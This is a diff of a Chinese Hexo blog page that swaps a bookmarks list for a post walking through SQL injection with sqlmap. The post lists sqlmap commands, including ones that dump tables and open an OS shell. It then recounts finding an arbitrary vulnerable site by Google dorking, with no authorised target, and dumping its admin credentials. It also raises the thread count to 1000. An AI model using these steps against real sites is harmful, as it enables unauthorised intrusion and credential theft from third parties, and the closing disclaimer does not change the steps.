@@ -69,12 +69,10 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="SQLmap," />
 
 
 
-
-  
 
 
   <link rel="alternate" href="/atom.xml" title="IYii's Blog" type="application/atom+xml" />
@@ -84,17 +82,24 @@
 
 
 
-<meta name="description" content="将书签页中收藏的技术站点汇集在此处方便查询(持续更新) 安全论坛 FreeBuf&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;阿里先知&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;Wiki&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;安全客&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;Tools&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;看雪论坛&amp;ensp;&amp;ensp;&amp;ensp;&amp;e">
-<meta property="og:type" content="website">
-<meta property="og:title" content="IYii&#39;s Blog">
-<meta property="og:url" content="http://iyii.me/SecWeb/index.html">
+<meta name="description" content="简介 Sqlmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令.  安装 $ git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev  基本使用方法:GET:1234567891">
+<meta name="keywords" content="SQLmap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次SQLmap注入实战">
+<meta property="og:url" content="http://iyii.me/2018/07/21/记一次SQLmap注入实战/index.html">
 <meta property="og:site_name" content="IYii&#39;s Blog">
-<meta property="og:description" content="将书签页中收藏的技术站点汇集在此处方便查询(持续更新) 安全论坛 FreeBuf&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;阿里先知&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;Wiki&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;安全客&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;Tools&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;看雪论坛&amp;ensp;&amp;ensp;&amp;ensp;&amp;e">
+<meta property="og:description" content="简介 Sqlmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令.  安装 $ git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev  基本使用方法:GET:1234567891">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-02-14T12:22:40.686Z">
+<meta property="og:image" content="http://iyii.me/upload_image/2018-07-21%2012-02-10屏幕截图.png">
+<meta property="og:image" content="http://iyii.me/upload_image/2018-07-21%2012-28-01屏幕截图.png">
+<meta property="og:image" content="http://iyii.me/upload_image/2018-07-21%2012-34-53屏幕截图.png">
+<meta property="og:image" content="http://iyii.me/upload_image/2018-07-21%2012-41-55屏幕截图.png">
+<meta property="og:image" content="http://iyii.me/upload_image/2018-07-21%2013-07-06屏幕截图.png">
+<meta property="og:updated_time" content="2018-07-21T05:10:32.178Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="IYii&#39;s Blog">
-<meta name="twitter:description" content="将书签页中收藏的技术站点汇集在此处方便查询(持续更新) 安全论坛 FreeBuf&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;阿里先知&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;Wiki&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;安全客&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;Tools&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;看雪论坛&amp;ensp;&amp;ensp;&amp;ensp;&amp;e">
+<meta name="twitter:title" content="记一次SQLmap注入实战">
+<meta name="twitter:description" content="简介 Sqlmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令.  安装 $ git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev  基本使用方法:GET:1234567891">
+<meta name="twitter:image" content="http://iyii.me/upload_image/2018-07-21%2012-02-10屏幕截图.png">
 
 
 
@@ -124,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://iyii.me/SecWeb/"/>
+  <link rel="canonical" href="http://iyii.me/2018/07/21/记一次SQLmap注入实战/"/>
 
 
 
 
 
-  <title> | IYii's Blog</title>
+  <title>记一次SQLmap注入实战 | IYii's Blog</title>
   
 
 
@@ -299,76 +304,247 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://iyii.me/2018/07/21/记一次SQLmap注入实战/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="IYii">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="IYii's Blog">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline"></h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <p><blockquote class="blockquote-center">将书签页中收藏的技术站点汇集在此处方便查询(持续更新)</blockquote></p>
-<h2 id="安全论坛"><a href="#安全论坛" class="headerlink" title="安全论坛"></a>安全论坛</h2><blockquote>
-<p><a href="http://www.freebuf.com/" target="_blank" rel="noopener">FreeBuf</a>&ensp;&ensp;&ensp;&ensp;<a href="https://xianzhi.aliyun.com/forum/" target="_blank" rel="noopener">阿里先知</a>&ensp;&ensp;&ensp;&ensp;<a href="http://wiki.ioin.in/" target="_blank" rel="noopener">Wiki</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.anquanke.com/" target="_blank" rel="noopener">安全客</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.t00ls.net/" target="_blank" rel="noopener">Tools</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.pediy.com/" target="_blank" rel="noopener">看雪论坛</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.kali.org.cn/" target="_blank" rel="noopener">Kali中文网</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.bugbank.cn/" target="_blank" rel="noopener">漏洞银行</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.ijiandao.com/" target="_blank" rel="noopener">爱尖刀</a></p>
-</blockquote>
-<h2 id="漏洞信息平台"><a href="#漏洞信息平台" class="headerlink" title="漏洞信息平台"></a>漏洞信息平台</h2><blockquote>
-<p><a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener">国家信息安全漏洞库</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.cnvd.org.cn/" target="_blank" rel="noopener">国家信息安全漏洞共享平台</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.us-cert.gov/" target="_blank" rel="noopener">美国国家应急响应中心</a>&ensp;&ensp;&ensp;&ensp;<a href="https://nvd.nist.gov/" target="_blank" rel="noopener">美国国家漏洞库</a>&ensp;&ensp;&ensp;&ensp;<a href="https://butian.360.cn/" target="_blank" rel="noopener">360补天</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.seebug.org/" target="_blank" rel="noopener">知道创宇seebug</a>&ensp;&ensp;&ensp;&ensp;<a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2015/ms15-034" target="_blank" rel="noopener">微软官方漏洞信息</a>&ensp;&ensp;&ensp;&ensp;<a href="https://bugs.chromium.org/hosting/" target="_blank" rel="noopener">谷歌漏洞提交平台</a></p>
-</blockquote>
-<h2 id="在线Tools"><a href="#在线Tools" class="headerlink" title="在线Tools"></a>在线Tools</h2><h2 id="漏洞检测平台"><a href="#漏洞检测平台" class="headerlink" title="漏洞检测平台"></a>漏洞检测平台</h2><blockquote>
-<p><a href="http://0day.websaas.com.cn/" target="_blank" rel="noopener">重大漏洞在线检测平台</a>&ensp;&ensp;&ensp;&ensp;<a href="http://sec.huawei.com/sec/web/index.do" target="_blank" rel="noopener">华为安全平台</a>&ensp;&ensp;&ensp;&ensp;<a href="https://scanner.baidu.com/" target="_blank" rel="noopener">在线Webshell扫描</a>&ensp;&ensp;&ensp;&ensp;<a href="https://guanjia.qq.com/online_server/webindex.html" target="_blank" rel="noopener">腾讯管家web检测</a></p>
-</blockquote>
-<h2 id="站长工具"><a href="#站长工具" class="headerlink" title="站长工具"></a>站长工具</h2><blockquote>
-<p><a href="http://www.atool.org/" target="_blank" rel="noopener">ATools</a>&ensp;&ensp;&ensp;&ensp;<a href="http://tool.chinaz.com/" target="_blank" rel="noopener">站长工具</a>&ensp;&ensp;&ensp;&ensp;<a href="http://tools.jb51.net/" target="_blank" rel="noopener">jb51_tools</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.aizhan.com/" target="_blank" rel="noopener">aizhan爱站网</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.icpchaxun.com/" target="_blank" rel="noopener">ipc查询(域名备案)</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.miitbeian.gov.cn/publish/query/indexFirst.action" target="_blank" rel="noopener">备案查询(工信部)</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.ip138.com/" target="_blank" rel="noopener">ip138(ip查询)</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.ipip.net/" target="_blank" rel="noopener">ipip(ip查询)</a>&ensp;&ensp;&ensp;&ensp;<a href="http://ipblock.chacuo.net/" target="_blank" rel="noopener">国家IP分布</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.gpsspg.com/" target="_blank" rel="noopener">GPSspg(经纬度查询)</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.opengps.cn/" target="_blank" rel="noopener">openGPS</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.t1shopper.com/tools/port-scan/#" target="_blank" rel="noopener">端口扫描</a><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">DnsDb(dns搜索引擎)</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.beianbeian.com/" target="_blank" rel="noopener">IPC备案查询</a>&ensp;&ensp;&ensp;&ensp;<a href="https://who.is/" target="_blank" rel="noopener">WHIOS</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.17ce.com/" target="_blank" rel="noopener">网站测试</a></p>
-</blockquote>
-<h2 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h2><blockquote>
-<p><a href="http://www.cmd5.com/" target="_blank" rel="noopener">CMD5</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.somd5.com/" target="_blank" rel="noopener">SOMD5</a>&ensp;&ensp;&ensp;&ensp;<a href="http://xmd5.com/" target="_blank" rel="noopener">XMD5</a>&ensp;&ensp;&ensp;&ensp;<a href="http://cracker.offensive-security.com/index.php" target="_blank" rel="noopener">hash查询</a>&ensp;&ensp;&ensp;&ensp;<a href="http://tool.chacuo.net/cryptdes" target="_blank" rel="noopener">DES/AES加密解密</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.jb51.net/tools/zhuanhuan.htm" target="_blank" rel="noopener">在线编码转换</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www1.tc711.com/tool/BASE64.htm" target="_blank" rel="noopener">Base64解码</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.bejson.com/11.com/tool/BASE64.htm" target="_blank" rel="noopener">beJson</a><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">云悉指纹扫描</a></p>
-</blockquote>
-<h2 id="程序员相关"><a href="#程序员相关" class="headerlink" title="程序员相关"></a>程序员相关</h2><blockquote>
-<p><a href="https://tool.lu/" target="_blank" rel="noopener">程序员工具</a>&ensp;&ensp;&ensp;&ensp;<a href="http://man.linuxde.net/" target="_blank" rel="noopener">Linux命令</a>&ensp;&ensp;&ensp;&ensp;<a href="https://searchcode.com/" target="_blank" rel="noopener">代码泄露查询</a></p>
-</blockquote>
-<h2 id="安全搜索引擎"><a href="#安全搜索引擎" class="headerlink" title="安全搜索引擎"></a>安全搜索引擎</h2><blockquote>
-<p><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">钟馗之眼</a>&ensp;&ensp;&ensp;&ensp;<a href="https://nosec.org/" target="_blank" rel="noopener">NOSEC大数据安全协作平台</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.ditecting.com/" target="_blank" rel="noopener">谛听</a>&ensp;&ensp;&ensp;&ensp;<a href="https://duckduckgo.com/" target="_blank" rel="noopener">DuckDuckgo匿名搜索</a>&ensp;&ensp;&ensp;&ensp;<a href="https://yippy.com/" target="_blank" rel="noopener">　Yippy暗网搜索</a>&ensp;&ensp;&ensp;&ensp;<a href="https://archive.org/web/" target="_blank" rel="noopener">Machine(搜索网站过去的样子)</a></p>
-</blockquote>
-<h2 id="域名注册商"><a href="#域名注册商" class="headerlink" title="域名注册商"></a>域名注册商</h2><blockquote>
-<p><a href="https://sg.godaddy.com/" target="_blank" rel="noopener">GoDaddy</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.dynadot.com/" target="_blank" rel="noopener">dynadot域名注册查询</a>&ensp;&ensp;&ensp;&ensp;<a href="https://wanwang.aliyun.com/" target="_blank" rel="noopener">阿里云万网</a></p>
-</blockquote>
-<h2 id="编程之道"><a href="#编程之道" class="headerlink" title="编程之道"></a>编程之道</h2><blockquote>
-<p><a href="https://stackoverflow.com/" target="_blank" rel="noopener">Stackoverflow</a>&ensp;&ensp;&ensp;&ensp;<a href="https://segmentfault.com/" target="_blank" rel="noopener">Segmentfault</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.oschina.nethttps://segmentfault.com/" target="_blank" rel="noopener">开源中国</a>&ensp;&ensp;&ensp;&ensp;<a href="http://blog.csdn.net/" target="_blank" rel="noopener">CSDN</a></p>
-</blockquote>
-<h2 id="Python社区"><a href="#Python社区" class="headerlink" title="Python社区"></a>Python社区</h2><blockquote>
-<p><a href="http://www.pythondoc.com/" target="_blank" rel="noopener">Python中文学习大本营</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.iplaypy.com/" target="_blank" rel="noopener">玩蛇网</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.jianshu.com/p/08ca72a0cf14" target="_blank" rel="noopener">python机器学习</a></p>
-</blockquote>
-<h2 id="充电练手平台"><a href="#充电练手平台" class="headerlink" title="充电练手平台"></a>充电练手平台</h2><blockquote>
-<p><a href="https://www.ichunqiu.com/" target="_blank" rel="noopener">i春秋</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.jikexueyuan.com/" target="_blank" rel="noopener">极客学院</a>&ensp;&ensp;&ensp;&ensp;<a href="http://open.freebuf.com/" target="_blank" rel="noopener">Freebuf公开课</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.hetianlab.com/" target="_blank" rel="noopener">合天网安</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.shiyanlou.com/" target="_blank" rel="noopener">实验楼</a>&ensp;&ensp;&ensp;&ensp;<a href="http://hackinglab.cn/" target="_blank" rel="noopener">hackinglab</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.runoob.com/" target="_blank" rel="noopener">菜鸟教程</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.imooc.com/" target="_blank" rel="noopener">慕课网</a>&ensp;&ensp;&ensp;&ensp;<a href="http://www.itcast.cn/" target="_blank" rel="noopener">传智播客</a>&ensp;&ensp;&ensp;&ensp;<a href="https://www.zhihu.com/question/30505597" target="_blank" rel="noopener">CTF练习平台</a></p>
-</blockquote>
-<h2 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目 "></a>开源项目 </h2><blockquote>
-<p><a href="https://github.com/vinta/awesome-python" target="_blank" rel="noopener">awesome-python(框架列表)</a>&ensp;&ensp;&ensp;&ensp;<a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="noopener">awesome-python(中文版)</a>&ensp;&ensp;&ensp;&ensp;<a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">渗透测试思维导图</a>&ensp;&ensp;&ensp;&ensp;<a href="https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md" target="_blank" rel="noopener">开源扫描工具</a>&ensp;&ensp;&ensp;&ensp;<a href="https://github.com/luyishisi/Anti-Anti-Spider" target="_blank" rel="noopener">反爬虫项目</a>&ensp;&ensp;&ensp;&ensp;<a href="https://github.com/littlecodersh/ItChat" target="_blank" rel="noopener">ItChat微信接口项目</a></p>
-</blockquote>
-<h2 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h2><blockquote>
-<p><a href="https://reg007.com/" target="_blank" rel="noopener">查询邮箱已注册过的网址</a>&ensp;&ensp;&ensp;&ensp;<a href="https://haveibeenpwned.com/" target="_blank" rel="noopener">pwned</a></p>
-</blockquote>
-<h2 id="国内镜像"><a href="#国内镜像" class="headerlink" title="国内镜像"></a>国内镜像</h2><blockquote>
-<p><a href="https://npm.taobao.org/" target="_blank" rel="noopener">taobao<br>npm镜像</a>&ensp;&ensp;&ensp;&ensp;<a href="http://mirrors.163.com/" target="_blank" rel="noopener">网易开源镜像站</a>&ensp;&ensp;&ensp;&ensp;<a href="https://mirrors.tuna.tsinghua.edu.cn/" target="_blank" rel="noopener">清华大学</a>&ensp;&ensp;&ensp;&ensp;<a href="http://mirror.lzu.edu.cn/" target="_blank" rel="noopener">兰州大学</a>&ensp;&ensp;&ensp;&ensp;<a href="http://mirrors.ustc.edu.cn/" target="_blank" rel="noopener">中国科学技术大学</a>&ensp;&ensp;&ensp;&ensp;<a href="http://mirrors.neusoft.edu.cn/" target="_blank" rel="noopener">东软信息学院</a>&ensp;&ensp;&ensp;&ensp;<a href="http://mirrors.zju.edu.cn/" target="_blank" rel="noopener">浙江大学</a></p>
-</blockquote>
-
+          <h1 class="post-title" itemprop="name headline">记一次SQLmap注入实战</h1>
         
-      </div>
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-21T11:19:36+08:00">
+                2018-07-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB安全/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv">热度
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>℃
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>Sqlmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令.</p>
+</blockquote>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote>
+<p>$ git clone <a href="https://github.com/sqlmapproject/sqlmap.git" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap.git</a> sqlmap-dev</p>
+</blockquote>
+<h2 id="基本使用方法"><a href="#基本使用方法" class="headerlink" title="基本使用方法:"></a>基本使用方法:</h2><h3 id="GET"><a href="#GET" class="headerlink" title="GET:"></a>GET:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot;    // 测试该注入点是否能够进行注入</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; --dbs    // 对注入点进行注入,并导出数据库名</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; -D database --tables    // 对database这个数据库进行表的猜测</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; -D database -T admin --columns    // 对database下的admin表中字段进行猜测</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; -D database -T admin -C user,password --dump</span><br><span class="line"></span><br><span class="line">// 对database下的admin表中user和password字段进行猜测并dump</span><br></pre></td></tr></table></figure>
+<h3 id="POST"><a href="#POST" class="headerlink" title="POST:"></a>POST:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -r header.txt</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -r header.txt --dbs</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// -r是从一个文件中载入HTTP请求</span><br><span class="line"></span><br><span class="line">// 其余都与GET一样将-u部分改成-r</span><br><span class="line"></span><br><span class="line">// header.txt</span><br><span class="line"></span><br><span class="line">POST /index.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http://127.0.0.1/index.php</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">id=1</span><br></pre></td></tr></table></figure>
+<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie:"></a>Cookie:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php&quot; --cookie=&quot;id=1&quot; --level=2</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 其余与GET一样,别忘记加上--cookie参数</span><br></pre></td></tr></table></figure>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他:"></a>其他:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; --os-shell    // 获取远程主机的shell</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; --os-cmd=&quot;whoami&quot;    // 执行远程主机的命令</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; --is-dba    // 检查DBMS用户是否为DBA</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -g &quot;inurl:php?id=&quot;    // 通过google寻找url带有php?id=字段的地址</span><br></pre></td></tr></table></figure>
+<h2 id="实战开始"><a href="#实战开始" class="headerlink" title="实战开始"></a>实战开始</h2><h3 id="找到潜在的攻击目标"><a href="#找到潜在的攻击目标" class="headerlink" title="找到潜在的攻击目标"></a>找到潜在的攻击目标</h3><p>第一步是找到有SQL注入漏洞的网站。如果你没有特定攻击目标，可以使用Google搜索 php?id=1 （或php?id= ＋ 学校）：</p>
+<blockquote>
+<p>找到目标 <a href="http://test.net/about.php?id=12" target="_blank" rel="noopener">http://test.net/about.php?id=12</a>   //这里我就用test代替网址了</p>
+</blockquote>
+<p>检测是否有SQL注入漏洞；在url后添加一个单符号（’），使用浏览器访问</p>
+<blockquote>
+<p><a href="http://test.net/about.php?id=12" target="_blank" rel="noopener">http://test.net/about.php?id=12</a> ‘      //如果网站没有SQL注入漏洞，使用上面的地址访问不会有问题。如果有SQL注入漏洞，会有错误输出：</p>
+</blockquote>
+<p><img src="/upload_image/2018-07-21 12-02-10屏幕截图.png" alt=""></p>
+<p>加上 and 1=1 和 and 1=2 ,一个正常显示，一个报错，可以确定存在注入漏洞了。</p>
+<p>下面来对注入点进行注入,并导出数据库名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python2 sqlmap.py -u &quot;http://test.net/about.php?id=12&quot; --dbs</span><br></pre></td></tr></table></figure>
+<p>自动探测数据库类型和漏洞，如果成功会列出数据库：</p>
+<p><img src="/upload_image/2018-07-21 12-28-01屏幕截图.png" alt="数据库"></p>
+<p>从这几个表的名称可以猜测出来，应该是这个xcdy表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python2 sqlmap.py -u &quot;http://test.net/about.php?id=12&quot; -D xcdy --tables</span><br></pre></td></tr></table></figure>
+<p><img src="/upload_image/2018-07-21 12-34-53屏幕截图.png" alt=""></p>
+<p>接下来获取表的字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python2 sqlmap.py -u &quot;http://test.net/about.php?id=12&quot; -D xcdy -T t_admin --columns</span><br></pre></td></tr></table></figure>
+<p><img src="/upload_image/2018-07-21 12-41-55屏幕截图.png" alt=""></p>
+<p>对 xcdy 下的t_admin表中username和pwd字段进行猜测并dump:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;hhttp://test.net/about.php?id=12&quot; -D xcdy -T t_admin -C user,password --dump</span><br></pre></td></tr></table></figure>
+<p><img src="/upload_image/2018-07-21 13-07-06屏幕截图.png" alt=""></p>
+<p>好了，账号和密码都出来了。</p>
+<p>这次实战主要是为了对SQLmap加深理解。</p>
+<h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><p>大家基本上都会遇到，sqlmap注入很慢，这是因为sqlmap默认的最大线程是10.<br>下面给出sqlmap修改最大线程数的方法;前提是:你的目标站服务器能抗住就行。</p>
+<h3 id="修改方法"><a href="#修改方法" class="headerlink" title="修改方法"></a>修改方法</h3><p>找到settings.py文件,具体在\lib\core\目录下</p>
+<p>找到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Maximum number of threads (avoiding connection issues and/or DoS)</span><br><span class="line">MAX_NUMBER_OF_THREADS = 10	修改为MAX_NUMBER_OF_THREADS = 1000</span><br></pre></td></tr></table></figure>
+<p>本文中提及的技术只适用于合法的渗透测试，请勿用于其他的非法用途，如用作其他非法用途于本文作者无关。</p>
+
       
     </div>
     
     
     
+
+<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2018/07/21/记一次SQLmap注入实战/">记一次SQLmap注入实战</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 IYii 的个人博客">IYii</a></p>
+  <p><span>发布时间:</span>2018年07月21日 - 11:07</p>
+  <p><span>最后更新:</span>2018年07月21日 - 13:07</p>
+  <p><span>原始链接:</span><a href="/2018/07/21/记一次SQLmap注入实战/" title="记一次SQLmap注入实战">http://iyii.me/2018/07/21/记一次SQLmap注入实战/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://iyii.me/2018/07/21/记一次SQLmap注入实战/"  aria-label="复制成功！"></i></span>
+  </p>
